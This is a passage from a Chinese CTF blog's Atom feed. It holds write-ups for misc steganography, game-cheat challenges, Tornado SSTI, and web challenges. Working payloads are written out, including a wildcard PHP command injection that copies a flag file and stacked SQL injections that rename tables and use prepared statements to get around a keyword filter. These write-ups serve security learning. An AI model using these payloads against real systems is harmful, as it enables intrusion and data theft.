class="line">使用identify查看帧率隐写</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556873-841246-image.png" alt="1582556873-841246-image"></p><p>得到</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556882-170934-image.png" alt="1582556882-170934-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">使用二进制符号进行替换，得到part7:61562</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556890-119730-image.png" alt="1582556890-119730-image"></p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556901-253914-image.png" alt="1582556901-253914-image"></p><p>通过银河字母表得到压缩包密码：yinhezm</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556910-414802-image.png" alt="1582556910-414802-image"></p><p>8.zip解压后得到文件：</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556920-783498-image.png" alt="1582556920-783498-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">提交32位人事：</span></pre></td></tr></table></figure><p>part1:068c<br>part2:555b<br>part3:578b<br>part4:0eae<br>part5:9d4b<br>part6:e52bd67<br>part7:61562<br>合并得到 ：068c555b578b0eae9d4be52bd6761562<br>9.rar解压后得到</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556939-954073-image.png" alt="1582556939-954073-image"></p><p>使用AltermateStreamView工具提取数据流</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556989-822273-image.png" alt="1582556989-822273-image"></p><p>拿到falg</p><p>FLAG值：<br>flag{8739459c-8d4e-4a34-92ee-5d75ae56ac4f}</p><p>wp来自<a href="https://wp.ctf.show/d/4-2020-2" target="_blank" rel="noopener">wp.ctf.show</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1.zip 解压后得到下列文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556671-780069-image.png&quot; alt=&quot;1582556671-780069-image&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="misc" scheme="http://lingxin16.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow游戏题</title>
    <link href="http://lingxin16.github.io/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/"/>
    <id>http://lingxin16.github.io/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/</id>
    <published>2020-03-03T07:53:31.000Z</published>
    <updated>2020-03-03T08:46:07.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h2><p>下载下来的压缩包，里边备注的有游戏地址，并且表明了这是个存档</p><a id="more"></a><p><img src="/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20200303160523.jpg" alt="QQ截图20200303160523"></p><p>载入存档之后删除围墙 发现右下角地图的flag</p><p><img src="/2020/03/03/ctfshow%E6%B8%B8%E6%88%8F%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20200303160250.jpg" alt="QQ截图20200303160250"></p><p>有一说一这游戏真好玩  附上游戏地址<a href="https://yorg.io/" target="_blank" rel="noopener">https://yorg.io/</a></p><h2 id="超级玛丽"><a href="#超级玛丽" class="headerlink" title="超级玛丽"></a>超级玛丽</h2><p>下载下来是nes文件，然后我们需要下载模拟器工具才能打开。我这里下载的是VirtuaNES</p><p>利用模拟器自带的金手指，搜索一些金手指代码，通关后公主会告诉你flag</p><p>这里我用的金手指代码：</p><p>0704-01-00 超能力(00水中大跳,01空中游泳)</p><p>075F-01-00 选大关(00-??,??由作品决定)</p><h2 id="魂斗罗-游戏flag-终结篇"><a href="#魂斗罗-游戏flag-终结篇" class="headerlink" title="魂斗罗  游戏flag 终结篇"></a>魂斗罗  游戏flag 终结篇</h2><p>和超级玛丽差不多，不过这里的flag是藏在最后一关的地图里，需要多观察。</p><p>不过其实这个flag也可以猜出来，嘿嘿</p><p>附上金手指代码：</p><p>0032-01-20（1P生命无限）</p><p>00B0-01-FF（1P无敌）</p><h2 id="植物大战僵尸"><a href="#植物大战僵尸" class="headerlink" title="植物大战僵尸"></a>植物大战僵尸</h2><p>出题人表示flag在通关后的mv里，这要是通关可要花点时间了，但是我们有两种办法可以读取</p><p>1.直接从网上复制别人的存档，修改本地存档，然后在制作人员那里可以观看mv</p><p>2.直接解pak包，在pak包里寻找flag</p><p>最终的flag是mv的背景音乐</p><p>不过我实在是听不出来正确的flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;misc22&quot;&gt;&lt;a href=&quot;#misc22&quot; class=&quot;headerlink&quot; title=&quot;misc22&quot;&gt;&lt;/a&gt;misc22&lt;/h2&gt;&lt;p&gt;下载下来的压缩包，里边备注的有游戏地址，并且表明了这是个存档&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctfshow" scheme="http://lingxin16.github.io/tags/ctfshow/"/>
    
      <category term="游戏" scheme="http://lingxin16.github.io/tags/%E6%B8%B8%E6%88%8F/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow红包题-web</title>
    <link href="http://lingxin16.github.io/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/"/>
    <id>http://lingxin16.github.io/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/</id>
    <published>2020-02-15T10:44:32.000Z</published>
    <updated>2020-03-03T07:56:04.763Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214135958.png" alt="QQ截图20200214135958"></p><p>直接看源代码</p><a id="more"></a><p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140007.png" alt="QQ截图20200214140007"></p><p>发现hint：?cmd=</p><p>可以推测大概是构造payload</p><p>接下来访问url/?cmd</p><p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140024.png" alt="QQ截图20200214140024"></p><p>通过观察发现过滤了不少符号，键盘上能用的没几个了……害</p><p>根据大佬给的提示，我们用仅存的几个符号构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;?p &#x2F;???????? p.ppp&#96;;?&gt;</span></pre></td></tr></table></figure><p>功能相当于是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;bin&#x2F;cp &#x2F;flag.txt p.ppp&#96;;?&gt;</span></pre></td></tr></table></figure><p>用cp命令，将flag.txt复制到p.ppp</p><p>接下来访问url/p.ppp，下载下来得到flag</p><p><img src="/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214140151.png" alt="QQ截图20200214140151"></p><p>关于构造的payload可以解释下?&gt;是关闭php标签 &lt;?=是使用php短标签来返回结果`是执行命令</p><p>而出题人给出的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;??p&#x2F;p?p??????&#96;;?&gt;</span></pre></td></tr></table></figure><p>是匹配到/tmp/phpXXXXXX文件，匹配到之后执行</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/02/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98-web/QQ%E6%88%AA%E5%9B%BE20200214135958.png&quot; alt=&quot;QQ截图20200214135958&quot;&gt;&lt;/p&gt;
&lt;p&gt;直接看源代码&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="ctfshow" scheme="http://lingxin16.github.io/tags/ctfshow/"/>
    
      <category term="通配符" scheme="http://lingxin16.github.io/tags/%E9%80%9A%E9%85%8D%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>Hgame-Week1-web</title>
    <link href="http://lingxin16.github.io/2020/02/01/Hgame-Week1-web/"/>
    <id>http://lingxin16.github.io/2020/02/01/Hgame-Week1-web/</id>
    <published>2020-01-31T16:35:15.000Z</published>
    <updated>2020-01-31T17:50:18.804Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web1-Cosmos-的博客"><a href="#web1-Cosmos-的博客" class="headerlink" title="web1-Cosmos 的博客"></a>web1-Cosmos 的博客</h2><p>打开网站</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004038.png" alt="QQ截图20200201004038"></p><a id="more"></a><p>发现提及到博客、github、版本管理工具，可以联想到git泄露（hexo博客能是白搭建的吗！！！）</p><p>构造url(/.git/config)</p><blockquote><p><a href="http://cosmos.hgame.n3ko.co/.git/config" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/.git/config</a></p></blockquote><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004006.png" alt="QQ截图20200201004006"></p><p>发现目标仓库</p><blockquote><p><a href="https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc" target="_blank" rel="noopener">https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc</a></p></blockquote><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004657.png" alt="QQ截图20200201004657"></p><p>根据提示解码</p><h2 id="web2-接头霸王"><a href="#web2-接头霸王" class="headerlink" title="web2-接头霸王"></a>web2-接头霸王</h2><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004847.png" alt="QQ截图20200201004847">根据提示利用burpsuit修改HTTP请求头 如图</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005415.png" alt="QQ截图20200201005415"></p><p>得到flag</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005327.png" alt="QQ截图20200201005327"></p><h2 id="web3-Code-World"><a href="#web3-Code-World" class="headerlink" title="web3-Code World"></a>web3-Code World</h2><p>打开之后发现报错403 Forbidden</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005544.png" alt="QQ截图20200201005544"></p><p>查看源代码发现</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005552.png" alt="QQ截图20200201005552"></p><p>很显然是被人刻意改动了，然后跳转到了/new.php</p><p>我们用burpsuit抓包发现其实报错是405 Not Allowed</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005935.png" alt="QQ截图20200201005935"></p><p>百度一下405 Not Allowed这个报错</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010056.png" alt="QQ截图20200201010056"></p><p>就是两种请求方式之间出错  然后我们修改请求方式即可正常打开</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010301.png" alt="QQ截图20200201010301"></p><p>根据提示利用url传参?a=4+6</p><p>这里+需要url编码%2b    即?a=4%2b6</p><p>然后利用POST请求得到flag</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010542.png" alt="QQ截图20200201010542"></p><h2 id="web4-🐔尼泰玫"><a href="#web4-🐔尼泰玫" class="headerlink" title="web4-🐔尼泰玫"></a>web4-🐔尼泰玫</h2><p>打开是个小游戏  cxk打篮球(手动滑稽)</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010909.png" alt="QQ截图20200201010909"></p><p>提示我们需要30000分才能拿到flag</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201011655.png" alt="QQ截图20200201011655"></p><p>然后我们在网络状态中发现了submit这个文件</p><p>查看之后发现是把分数数据发送给后台然后判断，我们直接抓包编辑重发</p><p>得到flag</p><p><img src="/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201011949.png" alt="QQ截图20200201011949"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;web1-Cosmos-的博客&quot;&gt;&lt;a href=&quot;#web1-Cosmos-的博客&quot; class=&quot;headerlink&quot; title=&quot;web1-Cosmos 的博客&quot;&gt;&lt;/a&gt;web1-Cosmos 的博客&lt;/h2&gt;&lt;p&gt;打开网站&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/02/01/Hgame-Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004038.png&quot; alt=&quot;QQ截图20200201004038&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="git泄露" scheme="http://lingxin16.github.io/tags/git%E6%B3%84%E9%9C%B2/"/>
    
      <category term="burpsuit" scheme="http://lingxin16.github.io/tags/burpsuit/"/>
    
  </entry>
  
  <entry>
    <title>护网杯2018-easy_tornado</title>
    <link href="http://lingxin16.github.io/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/"/>
    <id>http://lingxin16.github.io/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/</id>
    <published>2020-01-29T08:01:10.000Z</published>
    <updated>2020-01-31T17:52:38.113Z</updated>
    
    <content type="html"><![CDATA[<p>首先看题<img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160301.png" alt="QQ截图20200129160301"></p><a id="more"></a><p>里边的内容分别是</p><p><img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160448.png" alt="QQ截图20200129160448">)<img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160441.png" alt="QQ截图20200129160441">)<img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160434.png" alt="QQ截图20200129160434"></p><p>我们可以直接得出flag所在的文件夹是/fllllllllllllag</p><p>分析这三个的url</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d</a></p></blockquote><p>我们可以得出这样的结论，flag所在文件的url应该是<a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=</a><strong><strong><strong>**</strong></strong></strong></p><p>至于这个<strong><strong><strong>**</strong></strong></strong>应该就是md5(cookie_secret+md5(filename))</p><p>filename我们已经知道是fllllllllllllag，那么我们接下来只需要找到cookie_secret</p><p>利用burp抓包我们并没有找到cookie，只能上百度了……（那咋办嘛）</p><p>通过百度得知在error页面存在SSTI模板注入（又是一个看不懂的东西……）</p><p><img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/%E6%86%A8%E6%86%A8%E8%90%BD%E6%B3%AA.jpg" alt="憨憨落泪"></p><p>附上关于SSTI模板注入的博客：<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">SSTI完全学习</a></p><p>注入方式大概就是error?msg=0</p><p>……？？？？？？至于注入啥玩意儿，大佬说的是用handler.settings对象(这又是啥玩意儿，咱也不知道，咱也不敢问)</p><p>那么传递error?msg=</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=</a></p></blockquote><p>得到这个回显</p><p><img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129162705.png" alt="QQ截图20200129162705"></p><p>‘cookie_secret’: ‘66015e24-a274-4abf-bd65-6776ae208dc4’}</p><p>接下来构造</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1</a></p></blockquote><p>访问得到</p><p><img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129163253.png" alt="QQ截图20200129163253"></p><p>我太难了….<img src="/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/1.jpg" alt="1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先看题&lt;img src=&quot;/2020/01/29/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160301.png&quot; alt=&quot;QQ截图20200129160301&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="模板注入" scheme="http://lingxin16.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>强网杯-随便注</title>
    <link href="http://lingxin16.github.io/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <id>http://lingxin16.github.io/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
    <published>2020-01-12T07:06:22.000Z</published>
    <updated>2020-01-31T17:53:17.095Z</updated>
    
    <content type="html"><![CDATA[<p>通过简单的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">1&#39;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">1&#39;;order by 1;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2#</span></pre></td></tr></table></figure><p>得出有过滤规则</p><a id="more"></a><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>一些select update delect语句都被过滤了</p><p>那么我们就用堆叠注入（不要问为什么，我百度来的）</p><p>首先介绍一下堆叠注入，简单来说就说将多条语句并列执行（语句1;语句2）同时执行语句1,2</p><p><code>1‘;show databases;#</code>   查数据库</p><p><img src="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E5%BA%93.png" alt="查库"></p><p><code>1‘;show tables;#</code>   查表 发现有两个表</p><p><img src="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E8%A1%A8.png" alt="查表"></p><p><code>1&#39;;show columns from 1919810931114514;#</code>   </p><p><code>1&#39;;show columns from words;#</code>   </p><p>分别查第一张表和第二张表</p><p>这里的1919810931114514要用反引号`括起 （数字串为表名的表操作时要加反引号）</p><p><img src="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/words%E8%A1%A8.png" alt="words表"></p><p>在第一张表中发现了flag字段 但是只有words表有回显，然后看了一下大佬的绕过规则</p><p>这里通过修改表名</p><p><img src="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png" alt="修改表名"></p><p><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);#</code></p><p>然后用1’ or 1=1#得到flag</p><p><img src="/2020/01/12/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/flag.png" alt="flag"></p><p>这里还有大佬的另外几种绕过方式（通过mysql预处理）</p><p>语句1：</p><p><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p><p>是将select * from ’1919810931114514‘转化为16进制</p><p>语句2；</p><p><code>1&#39;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from 1919810931114514&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</code></p><p>(char(115,101,108,101,99,116)是把s e l e c t的ascii码转换为字符连接起来，再把后面的拼接起来就成了select * from ‘1919810931114514’)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过简单的注入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;;order by 1;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39; union select 1,2#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;得出有过滤规则&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="sql注入" scheme="http://lingxin16.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="buuctf" scheme="http://lingxin16.github.io/tags/buuctf/"/>
    
      <category term="堆叠注入" scheme="http://lingxin16.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>创建单页</title>
    <link href="http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/"/>
    <id>http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/</id>
    <published>2020-01-02T10:03:53.000Z</published>
    <updated>2020-01-31T17:27:51.474Z</updated>
    
    <content type="html"><![CDATA[<p>先用<code>hexo new page ceshi</code>建立一个ceshi的单页</p><p>通过在文件头中加入<code>layout:false</code>跳过主题渲染</p><a id="more"></a><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/QQ%E6%88%AA%E5%9B%BE20200102180630.png" alt="QQ截图20200102180630"></p><p>然后将html代码插入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% endraw %&#125;</span></pre></td></tr></table></figure><p>中，就可以了。</p><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/%E6%86%A8%E6%86%A8%E8%84%B8%E7%BA%A2.jpg" alt="憨憨脸红"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先用&lt;code&gt;hexo new page ceshi&lt;/code&gt;建立一个ceshi的单页&lt;/p&gt;
&lt;p&gt;通过在文件头中加入&lt;code&gt;layout:false&lt;/code&gt;跳过主题渲染&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="hexo" scheme="http://lingxin16.github.io/tags/hexo/"/>
    
      <category term="单页" scheme="http://lingxin16.github.io/tags/%E5%8D%95%E9%A1%B5/"/>
    
  </entry>
  
  <entry>
    <title>管道符漏洞</title>
    <link href="http://lingxin16.github.io/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/"/>
    <id>http://lingxin16.github.io/2020/01/01/%E7%AE%A1%E9%81%93%E7%AC%A6%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-31T17:01:18.000Z</published>
    <updated>2019-12-31T17:24:15.165Z</updated>
    
